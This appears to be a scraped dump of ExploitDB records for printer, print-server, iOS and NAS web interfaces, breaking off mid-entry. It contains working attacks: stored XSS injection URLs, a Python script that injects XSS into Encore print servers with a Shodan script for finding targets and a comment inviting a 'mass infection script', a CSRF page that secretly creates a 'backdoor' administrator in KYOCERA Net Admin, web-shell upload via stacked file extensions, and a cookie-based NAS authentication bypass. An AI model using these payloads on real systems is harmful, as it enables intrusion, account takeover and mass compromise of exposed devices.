href="/general/find.html">Apparaat&#32;zoeken</a></div><div><a href="/general/contact.html">Contactpersoon&#32;&&#32;locatie</a></div><div><a href="/general/sleep.html">Slaapstand</a></div><div><a href="/general/powerdown.html">Automatisch&#32;uitschakelen</a></div><div><a href="/general/language.html">Taal</a></div><div><a href="/general/panel.html">Paneel</a></div><div><a href="/general/replacetoner.html">Toner&#32;vervangen</a></div></div><div id="rightFrameContainer"><div id="rightFrame"><div id="mainContent"><div id="pageTitle"><h2>Log&#32;in</h2></div><div id="pageContents"><div class="contentsGroup"><p class="noteMessage">Om&#32;deze&#32;pagina&#32;te&#32;openen&#32;moet&#32;u&#32;inloggen.&#32;Log&#32;in&#32;s.v.p.</p></div></div></div></div></div><script type="text/javascript"><!--\r\nSetMinHeight();\r\n// --></script></div><div id="mainFrameBottomLeft"><div id="mainFrameBottomRight"><div id="mainFrameBottomInner"></div></div></div></div><div id="footerFrameContainer"><div id="copyright">Copyright(C) 2000-2014 Brother Industries, Ltd. All Rights Reserved.</div><div id="topBack"><a href="#">Top<img src="/common/images/ic_pt.gif" alt="Top" /></a></div></div></div></div></body></html>\r\n\r\n\r\n\r\n# How to fix it? : Update the printer to Firmware 1.16 and set a new password.\r\n\r\n# Screenshot : https://imgur.com/a/3OVTSZ4\r\n\r\n\r\n# Note: The vendor has been contacted on 30-5-2018.', u'description': u'Brother HL Series Printers 1.15 - Cross-Site Scripting', u'platform': u'hardware', u'author': u'Huy Kha', u'cve': [], u'source': u'ExploitDB', u'date': u'2018-06-04T00:00:00+00:00', u'_id': 44839, u'type': u'webapps', u'port': 0}

CVE: []
Description: Planet FPS-1101 - Cross-Site Scripting
{u'code': u'GotGeek Labs\r\nhttp://www.gotgeek.com.br/\r\n\r\nPlanet FPS-1101 Cross-site Scripting Vulnerability\r\n\r\n\r\n\r\n[+] Description\r\n\r\nEquipped with the Parallel printing interfaces, the FPS-1101 makes your\r\nprinter available be shared in most popular network environment.\r\n\r\nWith the embedded web server, the FPS-1101 is configurable through your\r\nnetwork PC\'s Web Browser. Moreover, PLANET also provides a utility of\r\nmanagement for Microsoft Windows systems. With various network printing\r\nmethods included Windows Peer-to-Peer printing, NetWare and Windows server\r\nbased Queues printing, LPR printing, Internet Printing Protocol (IPP) and\r\nAppleTalk for Macintosh, the FPS-1101 can be applied to any network easily.\r\n\r\n\r\n\r\n[+] Information\r\n\r\nTitle: Planet FPS-1101 Cross-site Scripting Vulnerability\r\nShodan Dork: ZOT-PS-30/8.3.0013 -WWW-Authenticate\r\nAdvisory: gg-011-2011\r\nDate: 03-15-2011\r\nLast update: 03-26-2011\r\nLink: http://www.gotgeek.com.br/pocs/gg-011-2011.txt\r\n\r\n\r\n\r\n[+] Vulnerabilities\r\n\r\nStored Cross-site Scripting:\r\nWeb interface from FPS-1101 Print Server is affected by stored cross-site scripting\r\nvulnerability because it fails to properly sanitize user-supplied input at\r\n"NDSContext" field in "NetWare NDS Settings" area.\r\nAn attacker may leverage this issue to execute arbitrary script code\r\nin the browser of an unsuspecting user in the context of the affected site.\r\n\r\nAfter injecting the XSS code, you need to access Netware status page.\r\n\r\n\r\nAffected Versions:\r\n\r\nPlanet FPS-1101 10/100Mbps Direct Attached Print Server\r\nFirmware: 8.03.30A 0013 (ZOT-PS-30/8.3.0013)\r\n          8.03.30A 0007 (ZOT-PS-30/8.3.0007)\r\n\r\nOther versions may also be vulnerable.\r\n\r\n\r\n\r\n[+] Proof of Concept/Exploit\r\n\r\nXSS:\r\nhttp://target/RESTART.HTM?NDSContext=</script><script>alert("xss")</script><script>\r\n\r\nand then..\r\n\r\nhttp://target/NETWARE.HTM\r\n\r\n\r\n\r\n[+] Timeline\r\n\r\n24-03-2011: first contact to vendor.\r\n27-03-2011: support contact response.\r\n28-03-2011: second contact and more information was sent.\r\n03-04-2011: no vendor response.\r\n04-04-2011: advisory published.\r\n\r\n\r\n\r\n[+] References\r\n\r\nhttp://www.planet.com.tw/en/product/product_ov.php?id=2359\r\n\r\n\r\n\r\n[+] Credits\r\n\r\nb0telh0', u'description': u'Planet FPS-1101 - Cross-Site Scripting', u'platform': u'hardware', u'author': u'b0telh0', u'cve': [], u'source': u'ExploitDB', u'date': u'2011-04-04T00:00:00+00:00', u'_id': 17117, u'type': u'webapps', u'port': 0}

CVE: []
Description: KYOCERA Net Admin 3.4 - Cross-Site Request Forgery (Add Admin)
{u'code': u'#Vendor: KYOCERA Corporation\r\n#Product https://global.kyocera.com\r\n#Affected version: 3.4.0906\r\n#\r\n#Summary: KYOCERA Net Admin is Kyocera\'s unified\r\n#device management software that uses a web-based\r\n#platform to give network administrators easy and\r\n#uncomplicated control to handle a fleet for up to\r\n#10,000 devices. Tasks that used to require multiple\r\n#programs or walking to each printer can now be\r\n#accomplished in a single, fast and modern environment.\r\n#\r\n#Desc: The application interface allows users to perform\r\n#certain actions via HTTP requests without performing\r\n#any validity checks to verify the requests. This can\r\n#be exploited to perform certain actions with administrative\r\n#privileges if a logged-in user visits a malicious web\r\n#site.\r\n#\r\n#Tested on: Microsoft Windows 7 Professional SP1 (EN)\r\n#Apache Tomcat/8.5.15\r\n#\r\n#\r\n#Vulnerability discovered by Gjoko \'LiquidWorm\' Krstic\r\n#@zeroscience\r\n#\r\n#\r\n#Advisory ID: ZSL-2018-5458\r\n#Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5458.php\r\n\r\n<html>\r\n<head>\r\n<title>KYOCERA Net Admin 3.4 CSRF Add Admin Exploit</title>\r\n</head>\r\n\r\n<body onload="exploitrun();">\r\n\r\n<!-- Add Administrator -->\r\n<form name="create_user" action="https://192.168.18.133:7443/fwk-web/jsp/addUser.faces" method="POST" target="frame0">\r\n <input type="hidden" name="userType" value="0" />\r\n <input type="hidden" name="addUserForm&#58;loginName" value="backdoor" />\r\n <input type="hidden" name="addUserForm&#58;pw" value="pass123" />\r\n <input type="hidden" name="addUserForm&#58;pwConfirm" value="pass123" />\r\n <input type="hidden" name="addUserForm&#58;role" value="administrator" />\r\n <input type="hidden" name="addUserForm&#58;required&#95;name" value="name" />\r\n <input type="hidden" name="addUserForm&#58;required&#95;email1" value="bd&#64;db&#46;ee" />\r\n <input type="hidden" name="addUserForm&#58;required&#95;role" value="administrator" />\r\n <input type="hidden" name="addUserForm&#58;optional&#95;name" value="Backdoor" />\r\n <input type="hidden" name="addUserForm&#58;company" value="ZSL" />\r\n <input type="hidden" name="addUserForm&#58;department" value="forensics" />\r\n <input type="hidden" name="addUserForm&#58;email2" value="bd2&#64;db&#46;ee" />\r\n <input type="hidden" name="addUserForm&#58;optional&#95;phone" value="123&#45;123&#45;1234" />\r\n <input type="hidden" name="addUserForm&#58;optional&#95;cell" value="321&#45;321&#45;3210" />\r\n <input type="hidden" name="addUserForm&#58;submitHidden" value="true" />\r\n <input type="hidden" name="addUserForm&#95;SUBMIT" value="1" />\r\n <input type="hidden" name="addUserForm&#58;&#95;link&#95;hidden&#95;" value="" />\r\n</form>\r\n\r\n<!-- Update Node -->\r\n<form name="update_node" action="https://192.168.18.133:7443/fwk-web/servlet/EventControllerServlet" method="GET" target="frame1">\r\n <input type="hidden" name="bname" value="" />\r\n <input type="hidden" name="ts" value="1522690965730" />\r\n <input type="hidden" name="cmd" value="tv&#95;set&#95;cur&#95;node" />\r\n <input type="hidden" name="node&#95;id" value="root&#46;user&#95;administration&#46;administrator&#46;backdoor" />\r\n</form>\r\n\r\n<iframe name="frame0"></iframe>\r\n<iframe name="frame1"></iframe>\r\n\r\n<script>\r\nfunction exploitrun()\r\n{\r\n    document.create_user.submit();\r\n    document.getElementsByTagName("iframe")[0].onload = function()\r\n    {\r\n        document.update_node.submit();\r\n        document.getElementsByTagName("iframe")[1].onload = function()\r\n    }\r\n}\r\n</script>\r\n\r\n</body>\r\n</html>', u'description': u'KYOCERA Net Admin 3.4 - Cross-Site Request Forgery (Add Admin)', u'platform': u'linux', u'author': u'LiquidWorm', u'cve': [], u'source': u'ExploitDB', u'date': u'2018-04-09T00:00:00+00:00', u'_id': 44431, u'type': u'webapps', u'port': 0}

CVE: []
Description: Encore ENPS-2012 - Cross-Site Scripting
{u'code': u'GotGeek Labs\r\nhttp://www.gotgeek.com.br/\r\n\r\nEncore ENPS-2012 Cross-site Scripting Vulnerability\r\n\r\n\r\n\r\n[+] Description\r\n\r\nEncore 3-Port Print Server converts a standalone USB or a parallel printer into\r\na shared printer, through a wired Ethernet connection. As a result, you can save\r\nthe cost and space for additional printers. ENPS-2012 can connect up to 3\r\nprinters - using the 2 USB2.0 ports and 1 parallel port - that users can share\r\nacross the Internet or local area network (LAN). Printing on the shared printers\r\nfrom anywhere on the Internet is as easy as printing from your own office.\r\nFor your convenience, ENPS-2012 comes with a friendly WEB-based configuration interface.\r\nThis device also supports multiple network protocols and operating systems, making\r\nshared printing in mixed-LAN environments easy.\r\n\r\n\r\n\r\n[+] Information\r\n\r\nTitle: Encore ENPS-2012 Cross-site Scripting Vulnerability\r\nShodan Dork: ZOT-PS-39/6.3.0008 -WWW-Authenticate\r\nAdvisory: gg-005-2011\r\nDate: 03-15-2011\r\nLast update: 03-26-2011\r\nLink: http://www.gotgeek.com.br/pocs/gg-005-2011.txt\r\n\r\n\r\n\r\n[+] Vulnerabilities\r\n\r\nStored Cross-site Scripting:\r\nWeb interface from ENPS-2012 Print Server is affected by stored cross-site scripting\r\nvulnerability because it fails to properly sanitize user-supplied input at\r\n"NDSContext" field in "NetWare NDS Settings" area.\r\nAn attacker may leverage this issue to execute arbitrary script code\r\nin the browser of an unsuspecting user in the context of the affected site.\r\n\r\nAfter injecting the XSS code, you need to access Netware status page.\r\n\r\nXSS:\r\nhttp://target/RESTART.HTM?NDSContext=</script><script>alert("xss")</script><script>\r\n\r\nand then..\r\n\r\nhttp://target/NETWARE.HTM\r\n\r\n\r\nAffected Version:\r\n\r\nEncore ENPS-2012 Print Server\r\nFirmware: 6.03.39E 0008 (ZOT-PS-39/6.3.0008) \r\n\r\nOther versions may also be vulnerable.\r\n\r\n\r\n\r\n[+] Proof of Concept/Exploit\r\n\r\n##\r\n#\r\n# Exploit created for Encore ENPS-2012\r\n# It can be easily modified to test other devices..\r\n# or you can create a mass infection script using your shodan skills :)\r\n#\r\n##\r\n\r\n\r\n# $ python enps-2012.py -t 10.1.1.245 -o 0 -s GOTGEEK\r\n#\r\n# [*] gotgeek labs\r\n# [*] http://gotgeek.com.br\r\n#\r\n# [*] XSS Options:\r\n# [*] 0 = alert(\'xss\')\r\n# [*] 1 = window.location=\'http://www.example.com/\'\r\n#\r\n#\r\n# [*] Checking print-server...\r\n# [+] Seems to be print-server ENPS-2012\r\n# [+] Injecting XSS code...\r\n# [*] Wait while the print-server restarts\r\n# [*] Checking XSS code...\r\n# [+] XSS Injected!\r\n#\r\n# [*] Done!\r\n\r\n\r\n\r\n#!/usr/bin/python\r\n#\r\n\r\nimport sys, time\r\nimport httplib, socket\r\nimport urllib, re\r\nfrom optparse import OptionParser\r\n\r\nurl = "/RESTART.HTM?PSName="\r\nurl2 = "&NDSContext="\r\n\r\nusage = "./%prog -t <target> -o <xss number> -s <true str>\\n"\r\nusage+= "Example: ./%prog -t 10.1.1.1 -o 0 -s GOTGEEK"\r\n\r\nparser = OptionParser(usage=usage)\r\nparser.add_option("-t", action="store", dest="target",\r\n                  help="target print-server")\r\nparser.add_option("-o", action="store", dest="xss",\r\n                  help="xss option")\r\nparser.add_option("-s", action="store", dest="truestr",\r\n                  help="true string to validate")\r\n(options, args) = parser.parse_args()\r\n\r\ndef banner():\r\n    print "\\n[*] gotgeek labs"\r\n    print "[*] http://gotgeek.com.br\\n"\r\n    print "[*] XSS Options:"\r\n    print "[*] 0 = alert(\'xss\')"\r\n    print "[*] 1 = window.location=\'http://www.example.com/\'\\n\\n"\r\n\r\nif len(sys.argv) < 4:\r\n    banner()\r\n    parser.print_help()\r\n    sys.exit(1)\r\n\r\n\r\ndef setxss():\r\n    xss = [ \'</script><script>alert("xss")</script><script>\',\r\n            \'</script><script>window.location="http://www.example.com/"</script><script>\' ]\r\n    options.xss = xss[int(options.xss)]\r\n    return options.xss\r\n\r\n\r\ndef checkurl():\r\n    try:\r\n        print "[*] Checking print-server..."\r\n        conn = httplib.HTTPConnection(options.target)\r\n        conn.request("GET", "/CNETWARE.HTM")\r\n        r1 = conn.getresponse()\r\n        if r1.status == 200:\r\n            print "[+] Seems to be print-server ENPS-2012"\r\n        else:\r\n            print "[-] None Found!\\n\\n"\r\n            sys.exit(1)\r\n    except socket.error, msg:\r\n        print "[-] Can\'t connect to the target!\\n\\n"\r\n        sys.exit(1)\r\n\r\n\r\ndef injxss():\r\n    try:\r\n        print "[+] Injecting XSS code..."\r\n        urllib.urlopen("http://"+options.target+url+options.truestr+url2+options.xss)\r\n    except:\r\n        print "[-] Can\'t connect to the target!\\n\\n"\r\n        sys.exit(1)\r\n\r\n\r\ndef checkxss():\r\n    print "[*] Wait while the print-server restarts"\r\n    time.sleep(20)\r\n    try:\r\n        print "[*] Checking XSS code..."\r\n        check = urllib.urlopen("http://"+options.target+"/NETWARE.HTM").read()\r\n        if re.search(options.truestr,check):\r\n            print "[+] XSS Injected!\\n"\r\n        else:\r\n            print "[-] XSS NOT Injected!\\n"\r\n            sys.exit(1)\r\n    except:\r\n        print "[-] Can\'t connect to the target!\\n\\n"\r\n        sys.exit(1)\r\n\r\n\r\n\r\ndef main():\r\n    banner()\r\n    setxss()\r\n    checkurl()\r\n    injxss()\r\n    checkxss()\r\n    print "[*] Done!\\n\\n"\r\n\r\nif __name__ == "__main__":\r\n    main()\r\n\r\n\r\n#\r\n##\r\n#\r\n\r\n# Looking for vulnerable devices using Shodan\r\n# Encore, TP-Link and etc.\r\n#\r\n\r\n# $ python shodan_zot_ps.py \'ZOT-PS -WWW-Authenticate\'\r\n#\r\n# [+] Results found: 2006\r\n#\r\n# xxx.xx.xx.xxx\r\n# xxx.xx.xx.xxx\r\n# xxx.xx.xx.xxx\r\n# ...\r\n\r\n\r\n\r\n#!/usr/bin/python\r\n#\r\n\r\nimport sys\r\nfrom shodan import WebAPI\r\n\r\nSHODAN_API_KEY = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"\r\napi = WebAPI(SHODAN_API_KEY)\r\n\r\ntry:\r\n    results = api.search(sys.argv[1])\r\n    print "\\n[+] Results found: %s\\n" % results[\'total\']\r\n    for result in results[\'matches\']:\r\n        print result[\'ip\']\r\n    print ""\r\nexcept Exception, e:\r\n    print "Error: %s" % e\r\n\r\n\r\n\r\n[+] Timeline\r\n\r\n16-03-2011: first contact to vendor.\r\n24-03-2011: second contact to vendor.\r\n03-04-2011: no vendor response.\r\n04-04-2011: advisory published.\r\n\r\n\r\n\r\n[+] References\r\n\r\nhttp://www.encore-usa.com/us/product/ENPS-2012\r\n\r\n\r\n\r\n[+] Credits\r\n\r\nb0telh0', u'description': u'Encore ENPS-2012 - Cross-Site Scripting', u'platform': u'hardware', u'author': u'b0telh0', u'cve': [], u'source': u'ExploitDB', u'date': u'2011-04-04T00:00:00+00:00', u'_id': 17112, u'type': u'webapps', u'port': 0}

CVE: []
Description: Print n Share 5.5 iOS - Multiple Web Vulnerabilities
{u'code': u'Document Title:\r\n===============\r\nPrint n Share v5.5 iOS - Multiple Web Vulnerabilities\r\n\r\n\r\nReferences (Source):\r\n====================\r\nhttp://www.vulnerability-lab.com/get_content.php?id=1154\r\n\r\n\r\nRelease Date:\r\n=============\r\n2013-12-06\r\n\r\n\r\nVulnerability Laboratory ID (VL-ID):\r\n====================================\r\n1154\r\n\r\n\r\nCommon Vulnerability Scoring System:\r\n====================================\r\n9.2\r\n\r\n\r\nProduct & Service Introduction:\r\n===============================\r\nPrint directly to the widest range of network or WiFi printers, without a computer or AirPrint! Alternatively print \r\nvia your Mac/PC to ALL printers including USB & Bluetooth printers. Print... documents cloud files,web pages,emails, \r\nattachments, photos, contacts, calendars, clipboard items, convert to PDF and much more - to ANY PRINTER!\r\n\r\n(Copy of the Homepage: https://itunes.apple.com/en/app/print-n-share-der-all-in-one/id301656026 \r\n\r\n\r\nAbstract Advisory Information:\r\n==============================\r\nThe Vulnerability Laboratory Research Team discovered multiple web vulnerabilities in the Print n Share v5.5 mobile application for apple iOS.\r\n\r\n\r\nVulnerability Disclosure Timeline:\r\n==================================\r\n2013-12-01:    Public Disclosure (Vulnerability Laboratory)\r\n\r\n\r\nDiscovery Status:\r\n=================\r\nPublished\r\n\r\n\r\nAffected Product(s):\r\n====================\r\nEuroSmartz Ltd\r\nProduct: Print n Share 5.5\r\n\r\n\r\nExploitation Technique:\r\n=======================\r\nRemote\r\n\r\n\r\nSeverity Level:\r\n===============\r\nCritical\r\n\r\n\r\nTechnical Details & Description:\r\n================================\r\n1.1\r\nA local file/path include web vulnerability has been discovered in the official Print n Share v5.5 mobile application for apple iOS.\r\nThe file include vulnerability allows remote attackers to include (upload) local file or path requests to compromise the application or service.\r\n\r\nThe remote file include web vulnerability is located in the import file module in the filename value. Remote attackers can inject own files or \r\npath requests by adding regular text files (add). It is also possible to use the `rename` or `import` function to inject. The file include and \r\npath request execute occurs in the main file dir index or subcategory listing of the mobile application. The security risk of the local file \r\ninclude web vulnerability is estimated as high(+) with a cvss (common vulnerability scoring system) count of 8.4(+).\r\n\r\nExploitation of the local file include web vulnerability requires no user interaction or privileged web-application user account with password. \r\nSuccessful exploitation of the vulnerability results in unauthorized local file uploads and path requests to compromise the device or mobile app.\r\n\r\nRequest Method(s):\r\n\t\t\t\t[+] [POST]\r\n\r\nVulnerable Inputs(s):\r\n\t\t\t\t[+] Neue Text Datei (New Text File)\r\n\t\t\t\t[+] Umbenennen File (Rename File)\r\n\r\nVulnerable Parameter(s):\r\n\t\t\t\t[+] filename\r\n\r\nAffected Module(s):\r\n\t\t\t\t[+] Index File Dir Listing (http://localhost:8080)\r\n\r\n\r\n\r\n1.2\r\nAn arbitrary file upload web vulnerability has been discovered in the official Print n Share v5.5 mobile application for apple iOS.\r\nThe arbitrary file upload issue allows remote attackers to upload files with multiple extensions to bypass the web-server or system validation.\r\n\r\nThe vulnerability is located in the import file module. Remote attackers are able to upload a php or js web-shells by renaming the file with \r\nmultiple extensions to bypass the file restriction mechanism. The attacker uploads for example a web-shell with the following name and extension \r\n`image.jpg.gif.js.php.jpg`. After the upload the attacker needs to open the file in the web application. He deletes the .jpg & . gif file \r\nextension and can access the application with elevated access rights. The security risk of the arbitrary file upload web vulnerability is \r\nestimated as high with a cvss (common vulnerability scoring system) count of 7.8(+).\r\n\r\nExploitation of the arbitrary file upload web vulnerability requires no user interaction or privilege application user account with password.\r\nSuccessful exploitation of the vulnerability results in unauthorized file access because of a compromise after the upload of web-shells.\r\n\r\n\r\nRequest Method(s):\r\n\t\t\t\t[+] [POST]\r\n\r\nVulnerable Module(s):\r\n\t\t\t\t[+] File Import\r\n\r\nVulnerable Inputs(s):\r\n\t\t\t\t[+] Importieren - File > Sync\r\n\r\nVulnerable Parameter(s):\r\n\t\t\t\t[+] filename (multiple extensions)\r\n\r\nAffected Module(s):\r\n\t\t\t\t[+] File Path Listing (http://localhost:8080)\r\n\r\n\r\n\r\n1.3\r\nA persistent input validation web vulnerability has been discovered in the official Print n Share v5.5 mobile application for apple iOS.\r\nThe (persistent) vulnerability allows remote attacker to inject own malicious script code on the application-side of the mobile application.\r\n\r\nThe persistent input validation vulnerability is located in the Ordername (foldername) value of the print n share mobile web-application.\r\nThe exploitation can be done by usage of the local standard iOS pictures or video (default) app. Attackers rename the local device photo \r\nor video foldername.The persistent execute occurs in the listed folder of the web-server interface (http://localhost:8080). Remote attackers \r\ncan also change the foldername by usage of the application to exploit (inject) via POST method own script code with persistent attack vector.\r\nThe vulnerable input are the `Ordername`(folder name), `Neuer Order` (new folder) and `Order Umbenennen` (folder rename). The security risk \r\nof the persistent input validation web vulnerability is estimated as medium(+) with a cvss (common vulnerability scoring system) count of 4.5(+).\r\n\r\nExploitation of the persistent input validation web vulnerability requires no privileged mobile application user account but low or medium \r\nuser interaction. Successful exploitation of the persistent vulnerability results in persistent session hijacking (customers) attacks, account \r\nsteal via persistent web attacks, persistent phishing or persistent manipulation of vulnerable module context.\r\n\r\nRequest Method(s):\r\n\t\t\t\t[+] [POST]\r\n\r\nVulnerable Input(s):\r\n\t\t\t\t[+] Ordnername - (Foldername)\r\n\t\t\t\t[+] Neuer Ordner - (New Folder)\r\n\t\t\t\t[+] Ordner Umbenennen - (Rename Folder)\r\n\r\nVulnerable Parameter(s):\r\n\t\t\t\t[+] foldername - (path)\r\n\r\nAffected Module(s):\r\n\t\t\t\t[+] File Dir List\r\n\r\n\r\nProof of Concept (PoC):\r\n=======================\r\n1.1\r\nThe file include web vulnerability can be exploited by remote attackers without user interaction and also without privileged \r\nweb-application user account. For security demonstration or to reproduce the vulnerability follow the steps and information below.\r\n\r\nPoC:\r\nhttp://localhost:8080/[LOCAL FILE INCLUDE WEB VULNERABILITY!]">X>"<<>"</[LOCAL FILE INCLUDE WEB VULNERABILITY!]">.php\r\n\r\n\r\nPoC Source: Local File Include Vulnerability - Filename\r\n\r\n<html><head>\r\n<title>/</title>\r\n<meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">\r\n</head>\r\n<body>\r\n<h2>?/</h2><br><a href="/Clip-Archiv/">Clip-Archiv/</a>\r\n<br>X<a href="/[LOCAL FILE INCLUDE WEB VULNERABILITY!]">X>"<<>"</[LOCAL FILE INCLUDE WEB VULNERABILITY!]">.php</a>\r\n<br><a href="/[LOCAL FILE INCLUDE WEB VULNERABILITY!]">[LOCAL FILE INCLUDE WEB VULNERABILITY!].txt</a>\r\n</body>\r\n<html>\r\n</iframe></a></body></html>\r\n\r\nReference(s):\r\nhttp://localhost:8080/\r\n\r\n\r\n\r\n1.2\r\nThe arbitrary file upload vulnerability can be exploited by remote attackers without user interaction and also without privileged \r\nweb-application user account. For security demonstration or to reproduce the vulnerability follow the steps and information below.\r\n\r\n\r\nPoC:\r\nhttp://localhost:8080/[file to path]">X>"<<>"</[ARBITRARY FILE UPLOAD WEB VULNERABILITY!]">.jpg.gif..html.js.php.gif.jpg\r\n\r\n\r\nPoC Source: Arbitrary File Upload Vulnerability - Filename\r\n\r\n<html><head>\r\n<title>/</title>\r\n<meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">\r\n</head>\r\n<body>\r\n<h2>?/</h2><br><a href="/Clip-Archiv/">Clip-Archiv/</a>\r\n<br>X<a href="/[file]">X>"<<>"</[ARBITRARY FILE UPLOAD WEB VULNERABILITY!]">.jpg.gif..html.js.php.gif.jpg</a>\r\n<br><a href="/[file]">[ARBITRARY FILE UPLOAD WEB VULNERABILITY!].jpg.gif..html.js.php.gif.jpg</a>\r\n</body>\r\n<html>\r\n</iframe></a></body></html>\r\n\r\nReference(s):\r\nhttp://localhost:8080/\r\n\r\n\r\n\r\n1.3\r\nThe persistent input validation vulnerability can be exploited by remote attackers without privileged web-application user account \r\nand with low user interaction. For security demonstration or to reproduce the vulnerability follow the steps and information below.\r\n\r\nPoC:\r\nhttp://localhost:8080/%3E%22%3C%3C%3E%22%3C[PERSISTENT INJECTED SCRIPT CODE!]%3E/">\r\n\r\n\r\nPoC Source: Persistent Input Validation Vulnerability - Ordnername (Foldername)\r\n\r\n<body>\r\n<h2>\ufeff/</h2><br><a href="http://localhost:8080/Clip-Archiv/">Clip-Archiv/</a>\r\n<br><a href="http://localhost:8080/%3E%22%3C%3C%3E%22%3C[PERSISTENT INJECTED SCRIPT CODE!]%3E/">>"\r\n<<>"<[PERSISTENT INJECTED SCRIPT CODE!]">/</a>\r\n<br><a href="/Schnellstart.txt">Schnellstart.txt</a>\r\n\r\n\r\nReference(s):\r\nhttp://localhost:8080/\r\n\r\n\r\n\r\nSolution - Fix & Patch:\r\n=======================\r\n1.1\r\nThe file include web vulnerability can be patched by a secure encode and parse of the filename and the connected path value.\r\n\r\n1.2\r\nto fix the arbitrary file upload vulnerability it is required to restrict with a filter mechanism the filename extensions.\r\nDisallow multiple extensions and setup and own exception-handling to prevent arbitrary file uploads and restricted file upload bypass.\r\n\r\n1.3\r\nTo patch the persistent input validation web vulnerability parse and encode the `Ordername` (foldername) input values \r\nin the import, add and rename function.\r\nFilter and encode also the vulnerable output section of the malicious injected test values.\r\n\r\n\r\nSecurity Risk:\r\n==============\r\n1.1\r\nThe security risk of the local file include web vulnerability is estimated as critical with a cvss (common vulnerability scoring system) count of 8.4(+).\r\n\r\n1.2\r\nThe security risk of the arbitrary file upload and upload restriction bypass vulnerability is estimated as high(+) with a cvss (common vulnerability scoring system) count of 7.8(+).\r\n\r\n1.3\r\nThe security risk of the persistent input validation web vulnerability is estimated as medium(+) with a cvss (common vulnerability scoring system) count of 4.5(+).\r\n\r\n\r\nCredits & Authors:\r\n==================\r\nVulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]\r\n\r\n\r\nDisclaimer & Information:\r\n=========================\r\nThe information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, \r\neither expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-\r\nLab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business \r\nprofits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some \r\nstates do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation \r\nmay not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases \r\nor trade with fraud/stolen material.\r\n\r\nDomains:    www.vulnerability-lab.com   \t- www.vuln-lab.com\t\t\t       - www.evolution-sec.com\r\nContact:    admin@vulnerability-lab.com \t- research@vulnerability-lab.com \t       - admin@evolution-sec.com\r\nSection:    www.vulnerability-lab.com/dev \t- forum.vulnerability-db.com \t\t       - magazine.vulnerability-db.com\r\nSocial:\t    twitter.com/#!/vuln_lab \t\t- facebook.com/VulnerabilityLab \t       - youtube.com/user/vulnerability0lab\r\nFeeds:\t    vulnerability-lab.com/rss/rss.php\t- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php\r\n\r\nAny modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. \r\nPermission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other \r\nmedia, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and \r\nother information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), \r\nmodify, use or edit our material contact (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.\r\n\r\n\t\t\t\tCopyright \ufffd 2013 | Vulnerability Laboratory [Evolution Security]\r\n\r\n\r\n-- \r\nVULNERABILITY LABORATORY RESEARCH TEAM\r\nDOMAIN: www.vulnerability-lab.com\r\nCONTACT: research@vulnerability-lab.com', u'description': u'Print n Share 5.5 iOS - Multiple Web Vulnerabilities', u'platform': u'ios', u'author': u'Vulnerability-Lab', u'cve': [], u'source': u'ExploitDB', u'date': u'2013-12-08T00:00:00+00:00', u'_id': 30146, u'type': u'webapps', u'port': 0}

CVE: []
Description: Lian Li NAS - Multiple Vulnerabilities
{u'code': u'# Exploit Title: Lian Li NAS Multiple vulnerabilities\r\n# Date: 21/07/2014\r\n# Exploit Author: pws\r\n# Vendor Homepage: http://www.lian-li.com/en/dt_portfolio_category/nas/\r\n# Firmware Link: https://www.dropbox.com/s/imvkndl8m5yj7qp/G5S604121826700.tar.gz\r\n# Tested on: Latest version\r\n# CVE : None yet\r\n\r\n1. Hardcoded cookie to access the admin section\r\n\r\nFile: /javascript/storlib.js\r\nfunction get_cookie()\r\n{\r\n\tvar allcookies = document.cookie;\r\n\tvar pos = allcookies.indexOf("LoginUser=admin");\r\n\tif (pos == -1)\r\n\t\tlocation = "/index.html";\r\n}\r\n\r\n2. Authentication bypass\r\n\r\nCreate such cookie: \'LoginUser=admin\' (document.cookie=\'LoginUser=admin\').\r\nThen, access the URL directly to get admin features.\r\n\r\nEg. \r\nhttp://192.168.1.1/cgi/telnet/telnet.cgi # enable/disable the Telnet server\r\nhttp://192.168.1.1/cgi/user/user.cgi     # manage users (change passwords, add user, ...)\r\n\r\nHere are all the cgi\'s accessible (firmware: G5S604121826700) :\r\n\r\ncgi/lan/lan.cgi\r\ncgi/lan/lan_nasHandler.cgi\r\ncgi/lan/lan_routerHandler.cgi\r\ncgi/information/information.cgi\r\ncgi/return/return.cgi\r\ncgi/account/account.cgi\r\ncgi/account/accountHandler.cgi\r\ncgi/lang/lang.cgi\r\ncgi/lang/langHandler.cgi\r\ncgi/backup/clear.cgi\r\ncgi/backup/fixed.cgi\r\ncgi/backup/ipaddress.cgi\r\ncgi/backup/listing.cgi\r\ncgi/backup/s.cgi\r\ncgi/backup/schedule.cgi\r\ncgi/backup/source.cgi\r\ncgi/backup/dd_schedule.cgi\r\ncgi/backup/decide.cgi\r\ncgi/backup/ipaddress1.cgi\r\ncgi/backup/s1.cgi\r\ncgi/backup/source1.cgi\r\ncgi/backup/ipaddress2.cgi\r\ncgi/backup/s2.cgi\r\ncgi/backup/source2.cgi\r\ncgi/backup/ipaddress3.cgi\r\ncgi/backup/s3.cgi\r\ncgi/backup/source3.cgi\r\ncgi/backup/ipaddress5.cgi\r\ncgi/backup/s5.cgi\r\ncgi/backup/source5.cgi\r\ncgi/backup/l.cgi\r\ncgi/backup/listing1.cgi\r\ncgi/backup/listing2.cgi\r\ncgi/backup/listing3.cgi\r\ncgi/backup/listing5.cgi\r\ncgi/backup/email.cgi\r\ncgi/backup/email1.cgi\r\ncgi/backup/fixed1.cgi\r\ncgi/backup/schedule1.cgi\r\ncgi/backup/email2.cgi\r